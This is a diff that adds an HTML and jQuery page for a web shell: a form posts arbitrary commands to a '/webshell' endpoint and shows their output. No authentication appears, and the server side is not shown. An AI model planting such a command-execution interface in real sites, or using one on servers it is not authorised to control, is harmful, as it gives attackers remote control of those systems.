@@ -1,0 +1,44 @@
+﻿<center>
+  <form id="Shell" name="Shell" action="/webshell" method="post">
+    <input type="text" class="form-control" id="command" name="command" placeholder="command" value="" />
+    <button type="submit" id="send" class="send">Execute</button>
+  </form>
+</center>
+<p>
+    <br />
+</p>
+<p style="white-space: pre-line;">
+    <span id="result"></span>
+</p>
+<script src="/jquery.min.js"></script>
+<script>
+function reverse(str) {
+    var element = document.createElement('div');
+    if (str) {
+      element.innerText = str;
+      element.textContent = str;
+    }
+    return element.innerHTML;
+  }
+  $(function() {
+    $("#Shell").submit(function() {
+      var formData = $("#Shell").serializeArray();
+      var dataObject = {
+        'command': formData[0].value
+      };
+      $.ajax({
+        type: "POST",
+        url: "/webshell",
+        data: JSON.stringify(dataObject),
+        contentType: "application/json",
+        success: function(data) {
+          document.getElementById("result").innerHTML = reverse(data);
+        },
+        error: function() {
+          document.getElementById("result").innerHTML = "Failed!";
+        }
+      });
+      return false;
+    });
+  });
+</script>
